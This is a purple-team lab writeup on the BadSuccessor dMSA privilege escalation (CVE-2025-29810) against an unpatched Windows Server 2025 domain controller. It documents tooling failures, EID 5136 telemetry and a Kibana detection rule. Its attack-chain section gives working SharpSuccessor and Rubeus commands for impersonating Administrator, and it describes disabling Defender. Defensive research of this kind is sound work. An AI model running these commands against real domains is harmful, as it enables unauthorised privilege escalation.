# Bad Successor (CVE-2025-29810) — Lab Writeup
**Author:** Osher Jacobs  
**Date:** April 2026  
**Domain:** `badsuccessor.local`  
**Repo:** `osherjacobs/AD-Lab-Research`

---

## Executive Summary

This writeup documents a full purple team lab execution of the Bad Successor dMSA privilege escalation technique (CVE-2025-29810) against an intentionally unpatched Windows Server 2025 Domain Controller. The goal was to validate the attack chain end-to-end, capture detection telemetry in ELK, and produce a production-grade Kibana detection rule.

**Result:** The KDC-side primitive is confirmed working at the protocol level. DA was not achieved due to unfixed parsing bugs in all available public tooling. This creates a gap between theoretical exploitability and practical weaponization. The detection rule is valid, tested, and ready for production deployment.

---

## Lab Infrastructure

| Machine | IP | OS | Role |
|---|---|---|---|
| Kali | 192.168.1.218 | Kali Linux | Attacker |
| WIN-ATTACK | 192.168.1.83 | Server 2022 Standard Eval | Domain-joined attack platform |
| DC02 (WIN-G4OJKPN3TOV) | 192.168.1.4 | Server 2025 Datacenter Eval Build 26100.32230 | Unpatched DC |
| ELK | 192.168.1.250 | Ubuntu | SIEM (Elasticsearch + Kibana) |

**Domain:** `badsuccessor.local`  
**Patch threshold:** 26100.4946 (DC02 is below — vulnerable)  
**DA account:** `ubuntu`  
**Low-privilege attacker:** `lowpriv`

---

## Background

In May 2025, Yuval Gordon (Akamai) published [BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory), documenting a novel Active Directory privilege escalation vulnerability in Windows Server 2025. The attack abuses Delegated Managed Service Accounts (dMSAs) — a new object type introduced with Server 2025 — to escalate from low-privileged user to Domain Administrator.

**Pre-patch primitive:** An attacker with `CreateChild` over any OU could create a dMSA, set `msDS-ManagedAccountPrecededByLink` to a DA account, and request a Kerberos ticket inheriting the DA's credentials.

**Post-patch:** Microsoft patched the `CreateChild` abuse path. The post-patch primitive (documented by Yuval and expanded by SpecterOps) requires `GenericWrite` on a target object plus `CreateChild` on an OU — a more constrained but still realistic misconfiguration in real environments.

This lab targets the **pre-patch primitive** on an intentionally unpatched DC.

---

## Lab Setup Pain — An Honest Account

> This section documents the actual friction encountered during lab construction. Understanding where the tooling ecosystem is broken is as valuable as the attack chain itself.

### DC Promotion
DC02 was promoted as the DC for `badsuccessor.local`. WIN-ATTACK was domain-joined from `lab2019.local` (previous lab domain), requiring:
- IPv6 disabled
- Registry hack to force unjoin from lab2019.local
- `LocalAccountTokenFilterPolicy=1` for remote admin

### LDAP Signing — The Wall
Server 2025 enforces LDAP signing by default. This blocked **every Linux-side LDAP tool**:
- `ldap3` (Python) — `strongerAuthRequired`
- `impacket` badsuccessor.py — `strongerAuthRequired`
- `powerview` (Kali) — connected but couldn't find objects due to signing
- Registry modification (`LDAPServerIntegrity=0`) — GPO kept overriding it back

**Resolution:** All attribute writes were performed from WIN-ATTACK using native Windows AD cmdlets, which handle LDAP signing transparently. This requires execution from a domain-joined context, which may not always be available to an attacker — a real operational constraint.

### Defender
Every attack binary was flagged before reaching the target:
- Standard Rubeus (2022) — no `/dmsa` support
- Kali-compiled Rubeus (dotnet SDK) — P/Invoke failures due to Linux cross-compilation
- JoeDibley/Rubeus PR #194 — NullReferenceException in `PA_DMSA_KEY_PACKAGE`
- GhostPack/Rubeus master — same NullReferenceException (unfixed in mainline)
- SharpSuccessor — intermittently failed to apply the critical attribute despite reporting success

Defender had to be disabled on WIN-ATTACK to transfer binaries. Even with real-time protection off, cloud-delivered protection flagged transfers at the network level.

### Auditing
DS Change auditing (`Directory Service Changes`) was not enabled by default. `auditpol` commands succeeded but were overridden by GPO until `gpupdate /force` was run. Object-level SACLs also needed to be set on the dMSA object itself — container-level SACLs alone were insufficient.

### Tooling Archaeology
The Rubeus binary shipping with Kali was from February 2022 — three years before dMSA support was added. GhostPack does not use tagged releases; the version string `v2.3.3` was identical between the 2022 binary and the 2026 master build. No way to tell from version alone.

---

## Attack Chain

### Step 1 — dMSA Setup (SharpSuccessor)

SharpSuccessor was used to configure the dMSA object. Built from [logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor) on a Windows dev machine with Visual Studio 2026.

**[WIN-ATTACK as lowpriv]**
```
SharpSuccessor.exe add /impersonate:Administrator /path:"CN=Managed Service Accounts,DC=badsuccessor,DC=local" /account:lowpriv /name:svc-backup
```

**Output:**
```
[+] Adding dnshostname svc-backup.badsuccessor.local
[+] Adding samaccountname svc-backup$
[+] Administrator's DN identified
[+] Attempting to write msDS-ManagedAccountPrecededByLink
[+] Wrote attribute successfully
[+] Attempting to write msDS-DelegatedMSAState attribute
[+] Attempting to set access rights on the dMSA object
[+] Attempting to write msDS-SupportedEncryptionTypes attribute
[+] Attempting to write userAccountControl attribute
Error: Access is denied.
```

**Key line:** `[+] Wrote attribute successfully` — `msDS-ManagedAccountPrecededByLink` set to `CN=Administrator,CN=Users,DC=badsuccessor,DC=local` by `lowpriv`. The `userAccountControl` denial is non-blocking.

> **Note:** In testing against a fully hardened Server 2025 DC with LDAP signing enforced, SharpSuccessor intermittently failed to apply the attribute despite reporting success. This was confirmed by querying the DC directly after the tool run. A manual `Set-ADObject` fallback from WIN-ATTACK was required to reliably trigger the attribute write and generate detection telemetry. The primary public tool for this technique fails against hardened targets.

### Step 2 — TGT via tgtdeleg

**[WIN-ATTACK as lowpriv]**
```
Rubeus.exe tgtdeleg /nowrap
```

Output confirms TGT obtained for `lowpriv` via fake delegation to `cifs/DC02.badsuccessor.local`.

### Step 3 — dMSA TGS Request

**[WIN-ATTACK as lowpriv]**
```
Rubeus.exe asktgs /dmsa /opsec /service:krbtgt/BADSUCCESSOR.LOCAL /targetuser:svc-backup$ /ticket:<TGT_BASE64> /nowrap /dc:192.168.1.4
```

**Critical output:**
```
[+] TGS request successful!
[!] Unhandled Rubeus exception:
System.NullReferenceException: Object reference not set to an instance of an object.
   at Rubeus.EncryptionKey..ctor(AsnElt body)
   at Rubeus.PA_KEY_LIST_REP..ctor(AsnElt body)
   at Rubeus.PA_DMSA_KEY_PACKAGE..ctor(AsnElt body)
```

**Interpretation:** The TGS response was successfully returned by the KDC before Rubeus crashed during parsing. This is a client-side bug, not a server-side rejection. The vulnerability is functioning as expected at the protocol level.

The ticket arrives. Rubeus can't read it.

This crash is present in **GhostPack Rubeus master** as of April 2026. It is not fixed in any public release.

---

## Tooling Findings

### Rubeus /dmsa Bug

The crash occurs in `PA_DMSA_KEY_PACKAGE..ctor` when parsing the KDC response. The ASN.1 structure returned by Server 2025 does not match the parser's assumptions — likely a nesting depth mismatch. The `previousKeys` field is OPTIONAL in the spec but the parser assumes its presence.

Root cause location: `lib/krb_structures/PA_DMSA_KEY_PACKAGE.cs` and `lib/krb_structures/PA_KEY_LIST_REP.cs`.

Multiple fix attempts were made during this lab with null guards and index adjustments. All produced either the same crash or a ticket with zeroed key material.

**Status:** Unfixed in public tooling as of April 2026.

### SharpSuccessor LDAP Signing Failure

In testing against fully hardened Server 2025 DCs with LDAP signing enforced, SharpSuccessor intermittently failed to apply the `msDS-ManagedAccountPrecededByLink` attribute despite reporting success. The tool dropped the critical attribute write silently. Confirmed by querying the DC directly after each tool run.

**Implication:** The detection rule will not fire if SharpSuccessor is used as the sole attack tool against a hardened Server 2025 DC — because the attack itself did not succeed.

---

## Detection

### Prerequisites

| Requirement | Command |
|---|---|
| DS Change auditing | `auditpol /set /subcategory:"Directory Service Changes" /success:enable` + `gpupdate /force` |
| Object SACL | Set `WriteProperty` audit rule on dMSA object for `Everyone (S-1-1-0)` |
| Winlogbeat event_id | `5136` must be in the winlogbeat.yml event_logs config |

### EID 5136 — Confirmed Telemetry

```
event.code: 5136
winlog.event_data.SubjectUserName: lowpriv
winlog.event_data.ObjectClass: msDS-DelegatedManagedServiceAccount
winlog.event_data.AttributeLDAPDisplayName: msDS-ManagedAccountPrecededByLink
winlog.event_data.AttributeValue: CN=Administrator,CN=Users,DC=badsuccessor,DC=local
winlog.event_data.OperationType: %%14674 (Value Added)
host.name: DC02.badsuccessor.local
```

### Kibana Detection Rule

**Rule Name:** `Bad Successor - dMSA Predecessor Link Attribute Write (EID 5136)`

**KQL:**
```kql
event.code: "5136" and 
winlog.event_data.AttributeLDAPDisplayName: "msDS-ManagedAccountPrecededByLink" and
winlog.event_data.OperationType: "%%14674" and
not winlog.event_data.SubjectUserSid: "S-1-5-18"
```

**Severity:** Critical  
**Risk Score:** 90  
**False Positive Rate:** No known legitimate use cases in typical enterprise environments.

**MITRE ATT&CK:**
- Tactic: Privilege Escalation (TA0004)
- Technique: Account Manipulation (T1098)

**Tags:** `Active Directory`, `Privilege Escalation`, `dMSA`, `Bad Successor`, `CVE-2025-29810`, `Windows Server 2025`

---

## Findings Summary

| Finding | Status |
|---|---|
| KDC issues dMSA TGS response on unpatched Server 2025 | ✅ Confirmed |
| EID 5136 fires on attribute write | ✅ Confirmed |
| Kibana rule validated against live telemetry | ✅ Confirmed |
| DA achieved via public tooling | ❌ Not achieved |
| GhostPack Rubeus /dmsa parsing bug | ❌ Unfixed in public repo |
| SharpSuccessor reliable against hardened Server 2025 | ❌ Intermittent silent failure |
| Linux tooling viable against Server 2025 LDAP signing | ❌ Blocked |

---

## Conclusions

The Bad Successor dMSA attack primitive is viable at the protocol and KDC level on unpatched Windows Server 2025 DCs. Public tooling cannot currently complete the attack chain end-to-end without modification. This creates a gap between theoretical exploitability and practical weaponization.

The SpecterOps demonstration (October 2025) suggests their chain relied on functionality not currently present in public tooling.

The detection is **tool-agnostic** — the invariant is a critical attribute write in the attack chain, not the tool. Any implementation that successfully writes `msDS-ManagedAccountPrecededByLink` will trigger EID 5136. The rule is production-ready.

**Patch recommendation:** Update Server 2025 DCs to build 26100.4946 or later.

---

## References

- [Akamai — BadSuccessor: Abusing dMSA for Privilege Escalation](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Yuval Gordon — BadSuccessor Is Dead, Long Live BadSuccessor(?)](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-long-live-badsuccessor)
- [SpecterOps — The (Near) Return of the King](https://specterops.io/blog/2025/10/20/the-near-return-of-the-king/)
- [logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [osherjacobs/AD-Lab-Research](https://github.com/osherjacobs/AD-Lab-Research)

<img width="1869" height="826" alt="kibanabadsuccessoralert" src="https://github.com/user-attachments/assets/b43bfeed-0fe8-4d59-a4ea-be3a99d2bb8b" />

<img width="1494" height="403" alt="SharpSuccessor1" src="https://github.com/user-attachments/assets/3cc342e9-b935-48eb-a9df-70c7130323d2" />

<img width="1854" height="729" alt="Rubeusasktgs" src="https://github.com/user-attachments/assets/bd54fe08-d0cc-4472-bb49-600d69eb5a9e" />

<img width="1850" height="537" alt="Rubeustgtdeleg" src="https://github.com/user-attachments/assets/f3ddeb26-c122-4e53-9e64-5b04ef0fc090" />




